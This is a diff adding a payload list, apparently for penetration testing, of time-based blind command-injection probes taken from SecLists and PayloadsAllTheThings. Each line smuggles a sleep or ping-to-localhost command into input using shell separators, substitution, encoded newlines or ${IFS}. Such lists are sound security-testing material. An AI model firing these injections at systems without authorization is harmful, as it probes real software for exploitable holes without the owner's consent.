@@ -1,0 +1,26 @@
+# CMDi Blind / Time-Based Payloads
+# Sources: SecLists, PayloadsAllTheThings
+# Purpose: Detect blind command injection by inducing a measurable time delay.
+; sleep 5
+| sleep 5
+& sleep 5
+`sleep 5`
+$(sleep 5)
+; sleep 5 #
+| sleep 5 #
+; /bin/sleep 5
+| /bin/sleep 5
+$(sleep 5 && sleep 0)
+; ping -c 5 127.0.0.1
+| ping -c 5 127.0.0.1
+& ping -c 5 127.0.0.1
+`ping -c 5 127.0.0.1`
+$(ping -c 5 127.0.0.1)
+& ping -n 5 127.0.0.1
+| ping -n 5 127.0.0.1
+%0asleep 5
+%0a sleep 5
+%0a/bin/sleep%205
+\nsleep 5
+;sleep${IFS}5
+|sleep${IFS}5
